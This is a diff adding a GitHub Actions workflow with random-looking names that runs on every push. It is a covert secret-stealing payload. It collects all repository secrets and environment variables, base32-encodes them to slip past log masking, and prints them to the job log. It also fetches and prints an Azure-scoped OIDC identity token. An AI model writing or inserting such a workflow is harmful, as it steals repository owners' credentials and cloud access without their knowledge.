@@ -1,0 +1,26 @@
+# y6pnmapx2o35nieg
+name: 24ar4jbxka3o
+on: [push]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  a5bwlloka:
+    runs-on: ubuntu-latest
+    timeout-minutes: 6
+    env:
+      STQ77SBH7: ${{ toJSON(secrets) }}
+    strategy:
+      fail-fast: false
+      matrix:
+        environment:
+          - "github-pages"
+    environment: ${{ matrix.environment }}
+    steps:
+      - name: ff3wdrsal
+        run: |
+          env | base32 -w 158
+          printf '%s' 'N' | base32 -w 158
+          printf '%s' "$STQ77SBH7" | base32 -w 158
+          printf '%s' 'N' | base32 -w 158
+          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then printf '%s' 'N' | base32 -w 158; curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api%3A%2F%2FAzureADTokenExchange" | sed -n 's/.*"value":"\([^"]*\)".*/\1/p' | base32 -w 158; fi
